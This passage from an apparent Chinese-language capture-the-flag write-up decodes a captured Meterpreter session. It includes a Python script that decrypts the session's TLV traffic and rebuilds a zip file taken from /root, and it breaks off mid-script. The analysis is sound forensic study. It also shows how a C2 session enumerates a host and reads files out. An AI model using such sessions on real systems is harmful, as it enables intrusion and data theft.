t=TLV_TYPE_COMMAND_ID        v=CORE_NEGOTIATE_TLV_ENCRYPT</span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;20785548998507895601672178&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_RESULT            v=b<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_SYM_KEY_TYPE      v=b<span class="string">&#x27;\x00\x00\x00\x01&#x27;</span></span><br><span class="line">TLV l=264      t=TLV_TYPE_ENC_SYM_KEY       v=b<span class="string">&#x27;-I\x1d\xc1\xa3YLu\xa9\x99/\x96&gt;\xe9\x1f\x9c\xf9g~\x0fH8\xee\xe1y\xf1&#x27;</span></span><br><span class="line">Packet: <span class="built_in">type</span>=Req  len=88       enc=AES256 sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_MACHINE_ID</span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;02317692758618192060783778&#x27;</span></span><br><span class="line">Packet: <span class="built_in">type</span>=Resp len=168      enc=AES256 sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">TLV l=24       t=TLV_TYPE_UUID              v=b<span class="string">&#x27;\xd2\x99\x93k\xe4W`\x99f `&quot;\x04\x0fx\xaa&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_MACHINE_ID</span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;02317692758618192060783778&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_RESULT            v=b<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">TLV l=54       t=TLV_TYPE_MACHINE_ID        v=b<span class="string">&#x27;10.10.13.37:b88b42ad757245&#x27;</span></span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>加密数据包的最后一行显示了MACHINE_ID的类型和IP地址的值。</p>
<h2 id="Meterpreter-Session-分析"><a href="#Meterpreter-Session-分析" class="headerlink" title="Meterpreter Session 分析"></a>Meterpreter Session 分析</h2><p>解析后的pcap的完整输出在<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuY29tLzB4ZGYvY3Rmc2NyaXB0cy8tL2Jsb2IvbWFzdGVyL2h0Yi1yZXNwb25zZS9tc2Zfb3V0cHV0LnR4dA==">msf_output.txt<i class="fa fa-external-link-alt"></i></span>。我将介绍一些重点。</p>
<p>每个请求包似乎都有COMMAND_ID和REQUEST_ID。COMMAND_ID定义了命令的类型(可以在<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXR0bGUvYmxvYi81MmRlM2M4OTI3MDFlMDEwMTc0NmI0NmVlOGI0N2I3NmNkZThkMmQ0L21ldHRsZS9zcmMvY29tbWFuZF9pZHMuaA==">command_ids.h<i class="fa fa-external-link-alt"></i></span>查看)。REQUEST_ID对于请求来说似乎是唯一的。例如:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Packet: <span class="built_in">type</span>=Req  len=88       enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b<span class="string">&#x27;\x00\x00\x04\x1f&#x27;</span></span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;507543306427&#x27;</span></span><br></pre></td></tr></table></figure>

<p>0x41f &#x3D; 1055 &#x3D; <code>COMMAND_ID_STDAPI_SYS_CONFIG_GETUID:=. 响应返回COMMAND_ID和REQUEST_ID(有时带有一些额外的数据?)以及UUID</code> and the result:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Packet: <span class="built_in">type</span>=Resp len=184      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">TLV l=24       t=TLV_TYPE_UUID              v=b<span class="string">&#x27;\xd2\x99\x93k\xe4W`\x99f `&quot;\x04\x0fx\xaa&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b<span class="string">&#x27;\x00\x00\x04\x1f&#x27;</span></span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;50754330642773297958&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_RESULT            v=b<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">TLV l=55       t=TLV_TYPE_USER_NAME         v=b<span class="string">&#x27;root @ response (uid&#x27;</span></span><br></pre></td></tr></table></figure>

<p>添加一些代码来解析这些命令id，将它们添加到常量中，然后像这样调用它:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">j = 0</span><br><span class="line"><span class="keyword">while</span> j + 8 &lt; len(tlv_data):</span><br><span class="line">    l = int.from_bytes(tlv_data[j:j+4], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> l == 0:</span><br><span class="line">        import pdb;pdb.set_trace()</span><br><span class="line">    t = int.from_bytes(tlv_data[j+4:j+8], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    v = tlv_data[j+8:j+l]</span><br><span class="line">    <span class="keyword">if</span> t == 0x20001: <span class="comment">#COMMAND_ID</span></span><br><span class="line">        v = cmd_ids[int.from_bytes(v[:4], <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;TLV l=&#123;l:&lt;8&#125; t=&#123;tlv_types[t]:&lt;26&#125; v=&#123;v if len(v) &lt;= 20 else v[:20]&#125;&quot;</span>)</span><br><span class="line">    j += l</span><br></pre></td></tr></table></figure>

<p>现在 REQUEST_ID 看起来:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Packet: <span class="built_in">type</span>=Req  len=88       enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=STDAPI_SYS_CONFIG_GETUID</span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;50754330642773297958262819401791\x00&#x27;</span></span><br><span class="line">Packet: <span class="built_in">type</span>=Resp len=184      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">TLV l=24       t=TLV_TYPE_UUID              v=b<span class="string">&#x27;\xd2\x99\x93k\xe4W`\x99f `&quot;\x04\x0fx\xaa&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=STDAPI_SYS_CONFIG_GETUID</span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;50754330642773297958262819401791\x00&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_RESULT            v=b<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">TLV l=55       t=TLV_TYPE_USER_NAME         v=b<span class="string">&#x27;root @ response (uid=0, gid=0, euid=0, egid=0)\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>另一个有趣的命令是FL_LS:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Packet: <span class="built_in">type</span>=Resp len=360      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">TLV l=24       t=TLV_TYPE_UUID              v=b<span class="string">&#x27;\xd2\x99\x93k\xe4W`\x99f `&quot;\x04\x0fx\xaa&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=STDAPI_FS_LS</span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;20050676170239424614686344865879\x00&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_RESULT            v=b<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">TLV l=20       t=TLV_TYPE_FILE_NAME         v=b<span class="string">&#x27;auto_update\x00&#x27;</span></span><br><span class="line">TLV l=29       t=TLV_TYPE_FILE_PATH         v=b<span class="string">&#x27;/dev/shm/auto_update\x00&#x27;</span></span><br><span class="line">TLV l=72       t=TLV_TYPE_STAT_BUF          v=b<span class="string">&quot;\x1a\x00\x00\x00\xed\x81\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x98\xc0\x0f\x00\x00\x00\x00\x00o&#x27;/b\x00\x00\x00\x00\x8a\x1e/b\x00\x00\x00\x00m&#x27;/b\x00\x00\x00\x00&quot;</span></span><br><span class="line">TLV l=18       t=TLV_TYPE_FILE_NAME         v=b<span class="string">&#x27;multipath\x00&#x27;</span></span><br><span class="line">TLV l=27       t=TLV_TYPE_FILE_PATH         v=b<span class="string">&#x27;/dev/shm/multipath\x00&#x27;</span></span><br><span class="line">TLV l=72       t=TLV_TYPE_STAT_BUF          v=b<span class="string">&#x27;\x1a\x00\x00\x00\xc0A\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\xc3&#x27;</span></span><br></pre></td></tr></table></figure>

<p>似乎对于每个文件，它都会返回FILE_NAME、FILE_PATH和STAT_BUF。不确定如何解释STAT_BUF。</p>
<p>可以看到会话中执行的命令及其结果:</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Response</th>
</tr>
</thead>
<tbody><tr>
<td>CORE_NEGOTIATE_TLV_ENCRYPTION (includes RSA public key)</td>
<td>Sends encrypted symmetric key</td>
</tr>
<tr>
<td>CORE_MACHINE_ID</td>
<td>10.10.13.37:b88b42ad757245828e688fdbfa4824f8</td>
</tr>
<tr>
<td>CORE_SET_SESSION_GUID</td>
<td>-</td>
</tr>
<tr>
<td>CORE_ENUMEXTCMD</td>
<td>Returns a long list of UINTs</td>
</tr>
<tr>
<td>STDAPI_FS_GETWD</td>
<td>&#x2F;dev&#x2F;shm</td>
</tr>
<tr>
<td>STDAPI_SYS_CONFIG_GETUID</td>
<td>root @ response root @ response (uid&#x3D;0, gid&#x3D;0, euid&#x3D;0, egid&#x3D;0)</td>
</tr>
<tr>
<td>STDAPI_SYS_CONFIG_SYSINFO</td>
<td>Three TLVS:</td>
</tr>
<tr>
<td>COMPUTER_NAME &#x3D; 10.10.13.37</td>
<td></td>
</tr>
<tr>
<td>OS_NAME &#x3D; Ubuntu 20.04 (Linux 5.4.0-100-generic)</td>
<td></td>
</tr>
<tr>
<td>ARCHITECTURE &#x3D; x86_64</td>
<td></td>
</tr>
<tr>
<td>BUILD_TUPLE &#x3D; x86_64-linux-musl</td>
<td></td>
</tr>
<tr>
<td>STDAPI_NET_CONFIG_GET_INTERFACES</td>
<td>Full list of interfaces</td>
</tr>
<tr>
<td>STDAPI_NET_CONFIG_GET_ROUTES</td>
<td>Full list of routes</td>
</tr>
<tr>
<td>STDAPI_FS_GETWD</td>
<td>&#x2F;dev&#x2F;shm</td>
</tr>
<tr>
<td>STDAPI_FS_STAT, FILE_PATH &#x3D; &#x2F;dev&#x2F;shm</td>
<td>A STAT_BUF. Not sure how to interpret.</td>
</tr>
<tr>
<td>STDAPI_FS_LS, DIRECTORY_PATH &#x3D; &#x2F;dev&#x2F;shm</td>
<td>Two files, auto_update and multipath.</td>
</tr>
<tr>
<td>STDAPI_FS_GETWD</td>
<td>&#x2F;dev&#x2F;shm</td>
</tr>
<tr>
<td>STDAPI_FS_STAT, FILE_PATH &#x3D; &#x2F;root</td>
<td>A STAT_BUF. Not sure how to interpret.</td>
</tr>
<tr>
<td>STDAPI_FS_LS, DIRECTORY_PATH &#x3D; &#x2F;root</td>
<td>Files in &#x2F;root.</td>
</tr>
<tr>
<td>STDAPI_FS_STAT, FILE_PATH &#x3D; &#x2F;root&#x2F;docs_backup.zip</td>
<td>A STAT_BUF. Not sure how to interpret.</td>
</tr>
<tr>
<td>CORE_CHANNEL_OPEN, FILE_PATH &#x3D; &#x2F;root&#x2F;docs_backup.zip</td>
<td>Returns a channel id.</td>
</tr>
<tr>
<td>STDAPI_FS_STAT, FILE_PATH &#x3D; &#x2F;root&#x2F;docs_backup.zip</td>
<td>A STAT_BUF. Not sure how to interpret.</td>
</tr>
<tr>
<td>CORE_CHANNEL_READ, CHANNEL_ID &#x3D; 1</td>
<td>1,048,576 bytes, starting with PK</td>
</tr>
<tr>
<td>CORE_CHANNEL_READ, CHANNEL_ID &#x3D; 1</td>
<td>225,962 bytes</td>
</tr>
<tr>
<td>CORE_CHANNEL_READ, CHANNEL_ID &#x3D; 1</td>
<td>No data</td>
</tr>
<tr>
<td>CORE_CHANNEL_EOF, CHANNEL_ID &#x3D; 1</td>
<td>-</td>
</tr>
<tr>
<td>CORE_CHANNEL_CLOSE, CHANNEL_ID &#x3D; 1</td>
<td>-</td>
</tr>
</tbody></table>
<h2 id="Extract-Zip"><a href="#Extract-Zip" class="headerlink" title="Extract Zip"></a>Extract Zip</h2><p>注意到，大文件传输发生在上传&#x2F;root&#x2F;docs_backup.zip时。报告中的提示已经提到需要进入zip存档。将添加一些代码来保存zip文件。有三个CHANNEL_READ请求:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Packet: <span class="built_in">type</span>=Req  len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ</span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;81583094782444646844363494472485\x00&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b<span class="string">&#x27;\x00\x00\x00\x01&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_LENGTH            v=b<span class="string">&#x27;\x00\x10\x00\x00&#x27;</span></span><br><span class="line">Packet: <span class="built_in">type</span>=Resp len=1048712  enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">TLV l=24       t=TLV_TYPE_UUID              v=b<span class="string">&#x27;\xd2\x99\x93k\xe4W`\x99f `&quot;\x04\x0fx\xaa&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ</span><br><span class="line">TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b<span class="string">&#x27;\x00\x00\x00\x01&#x27;</span></span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;81583094782444646844363494472485\x00&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_RESULT            v=b<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">TLV l=1048584  t=TLV_TYPE_CHANNEL_DATA      v=b<span class="string">&#x27;PK\x03\x04\n\x00\x00\x00\x00\x00\xb4TnT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x1c\x00Documents/UT\t\x00\x03\xe3\x0c/b\\\x9bJcux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x03\x04\x14\x00\x00\x00\x08\x00\xabTnT\x1cV\x87\xf8\x85\x00\x00\x00\xf5\x00\x00\x00\x14\x00\x1c\x00Documents/.tmux.confUT\t\x00\x03\xd1\x0c/ba\r/bux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00\x8d\x8e\xc1\n\xc3 \x10D\xef~\xc5b)9\t\xbd\xf4&#123;\x82\xda\xad.5\xab\xe8\xa6!\x94\xfe&#123;\x95\xder(\x9d\xd30\xf3\x06\xa6\xa1\x80\t\x10\xa9I\xae\xbbI\xb4\x90\xc0\xf5\xd2&#x27;</span></span><br><span class="line">Packet: <span class="built_in">type</span>=Req  len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ</span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;48857921355208983185187224372436\x00&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b<span class="string">&#x27;\x00\x00\x00\x01&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_LENGTH            v=b<span class="string">&#x27;\x00\x10\x00\x00&#x27;</span></span><br><span class="line">Packet: <span class="built_in">type</span>=Resp len=226104   enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">TLV l=24       t=TLV_TYPE_UUID              v=b<span class="string">&#x27;\xd2\x99\x93k\xe4W`\x99f `&quot;\x04\x0fx\xaa&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ</span><br><span class="line">TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b<span class="string">&#x27;\x00\x00\x00\x01&#x27;</span></span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;48857921355208983185187224372436\x00&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_RESULT            v=b<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">TLV l=225970   t=TLV_TYPE_CHANNEL_DATA      v=b<span class="string">&#x27;\xfa\x8a&quot;\x15\xb3[BS\x04~\x15VV\x80\xbc!\xb7)Q&lt;\xce\xe5\xc0y1\x19U\xbe\x94\xd4\x1e\xd6\xd0D\x12\xb5S\xe3\xa6&quot;a@\xfaXO\x9a\xb2V\xf4\xceb\xbd\xde\xbf\xda\\.\x81\xd1\xd6\nzc|E\x16c\xc7X`*\xf8\x88\x11e;\xdb1T\xfe\xc8\xd1_\xbf,\xb1!!A\x9eg\xba\xde\xa5\x99$\xf9\x81&#123;\xbc\x14b\xe2\x9a;\x16\xb0\xee^%\xf6`]\x85\x00x:a\x0c\xbe\xe3\x97i\x97\xcdJ&#123;\xf5]w2G\xe0D\xe5P\x8a\xd8d\xe2j\&#x27;</span>\x13\xfe\xa1\xae\x1c\xc6zF\x0c\x94L\xcc\xd7\xdd\x9dj\xa1\xe7\xaa\x83t\xd4\xc1\xa7W\x1b\xac\x1e\x8f\xa0\x19\x0f^T\xfa \xf3e\xf0\xddg\x05GWnj\xa2\xfb \xf0\xd0\xd8\xe3(\xab\xb8\xb6C<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Packet: type=Req  len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span></span><br><span class="line"><span class="string">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ</span></span><br><span class="line"><span class="string">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b&#x27;</span>71560517686021057956178610979680\x00<span class="string">&#x27;</span></span><br><span class="line"><span class="string">TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b&#x27;</span>\x00\x00\x00\x01<span class="string">&#x27;</span></span><br><span class="line"><span class="string">TLV l=12       t=TLV_TYPE_LENGTH            v=b&#x27;</span>\x00\x10\x00\x00<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Packet: type=Resp len=136      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span></span><br><span class="line"><span class="string">TLV l=24       t=TLV_TYPE_UUID              v=b&#x27;</span>\xd2\x99\x93k\xe4W`\x99f `<span class="string">&quot;\x04\x0fx\xaa&#x27;</span></span><br><span class="line"><span class="string">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ</span></span><br><span class="line"><span class="string">TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b&#x27;\x00\x00\x00\x01&#x27;</span></span><br><span class="line"><span class="string">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b&#x27;71560517686021057956178610979680\x00&#x27;</span></span><br><span class="line"><span class="string">TLV l=12       t=TLV_TYPE_RESULT            v=b&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">TLV l=8        t=TLV_TYPE_CHANNEL_DATA      v=b&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果它是TLV_TYPE_CHANNEL_DATA，将其保存到一个文件中。如果有很多文件，从channel打开请求中解析文件名，然后根据channel id保存。假设只有一个文件，如果TLV类型是CHANNEL_DATA，创建该文件并保存到其中。在脚本顶部，将清除该文件中的任何现有数据(否则在一行中运行两次将给出双zip):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&#x27;docs_backup.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).close() <span class="comment"># clear zip file</span></span><br></pre></td></tr></table></figure>

<p>现在解析tlv的循环中，将添加一个CHANNEL_DATA检查:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> j &lt; len(tlv_data):</span><br><span class="line">    l = int.from_bytes(tlv_data[j:j+4], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> j + l &gt; len(tlv_data) or l == 0:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    t = int.from_bytes(tlv_data[j+4:j+8], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    v = tlv_data[j+8:j+l]</span><br><span class="line">    <span class="keyword">if</span> t == 0x20001: <span class="comment">#COMMAND_ID</span></span><br><span class="line">        v = cmd_ids[int.from_bytes(v[:4], <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line">    <span class="keyword">elif</span> t == 0x40034: <span class="comment">#CHANNEL_DATA</span></span><br><span class="line">        with open(<span class="string">&#x27;docs_backup.zip&#x27;</span>, <span class="string">&#x27;ab&#x27;</span>) as f:</span><br><span class="line">            f.write(v)</span><br><span class="line">    <span class="keyword">if</span> len(v) &gt; 200:</span><br><span class="line">        v = v[:200]</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;TLV l=&#123;l:&lt;8&#125; t=&#123;tlv_types[t]:&lt;26&#125; v=&#123;v&#125;&quot;</span>)</span><br><span class="line">    j += l</span><br></pre></td></tr></table></figure>

<p>运行脚本得到zip:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@hacky$ file docs_backup.zip </span><br><span class="line">docs_backup.zip: Zip archive data, at least v1.0 to extract</span><br></pre></td></tr></table></figure>

<ul>
<li>完整脚本parse_msf.py:</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import uuid</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from scapy.all import *</span><br><span class="line">from msfconsts import tlv_types, cmd_ids</span><br><span class="line"></span><br><span class="line">enc_types = &#123;0: <span class="string">&quot;None&quot;</span>, 1: <span class="string">&quot;AES256&quot;</span>, 2: <span class="string">&quot;AES128&quot;</span>&#125;</span><br><span class="line">packet_types = &#123;0: <span class="string">&quot;Req&quot;</span>, 1: <span class="string">&quot;Resp&quot;</span>&#125;</span><br><span class="line">aes_key = bytes.fromhex(<span class="string">&#x27;f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5&#x27;</span>)</span><br><span class="line">open(<span class="string">&#x27;docs_backup.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).close() <span class="comment"># clear zip file</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def xor(buf, key):</span><br><span class="line">    <span class="built_in">return</span> bytes([x ^ key[i % len(key)] <span class="keyword">for</span> i, x <span class="keyword">in</span> enumerate(buf)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pull all bytes into a stream</span></span><br><span class="line">pcap = rdpcap(<span class="string">&quot;./msf.pcap&quot;</span>)</span><br><span class="line">stream = b<span class="string">&quot;&quot;</span>.<span class="built_in">join</span>([bytes(packet[TCP].payload) <span class="keyword">for</span> packet <span class="keyword">in</span> pcap <span class="keyword">if</span> TCP <span class="keyword">in</span> packet])</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line"><span class="keyword">while</span> i &lt; len(stream):</span><br><span class="line">    xor_head = stream[i:i+32]</span><br><span class="line">    xor_key = xor_head[:4]</span><br><span class="line">    <span class="built_in">head</span> = xor(xor_head, xor_key)</span><br><span class="line">    session_guid = <span class="built_in">head</span>[4:20]</span><br><span class="line">    enc_flag = int.from_bytes(<span class="built_in">head</span>[20:24], <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    packet_len = int.from_bytes(<span class="built_in">head</span>[24:28], <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    packet_type = int.from_bytes(<span class="built_in">head</span>[28:32], <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;Packet: type=&#123;packet_types[packet_type]:&lt;4&#125; len=&#123;packet_len:&lt;8&#125; enc=&#123;enc_types[enc_flag]&#125; sess=&#123;uuid.UUID(bytes=session_guid)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    tlv_data = xor(stream[i+32:i+packet_len+24], xor_key)</span><br><span class="line">    <span class="keyword">if</span> enc_flag == 1:</span><br><span class="line">        aes_iv = tlv_data[:16]</span><br><span class="line">        cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)</span><br><span class="line">        tlv_data = cipher.decrypt(tlv_data[16:])</span><br><span class="line"></span><br><span class="line">    j = 0</span><br><span class="line">    <span class="keyword">while</span> j &lt; len(tlv_data):</span><br><span class="line">        l = int.from_bytes(tlv_data[j:j+4], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> j + l &gt; len(tlv_data) or l == 0:</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        t = int.from_bytes(tlv_data[j+4:j+8], <span 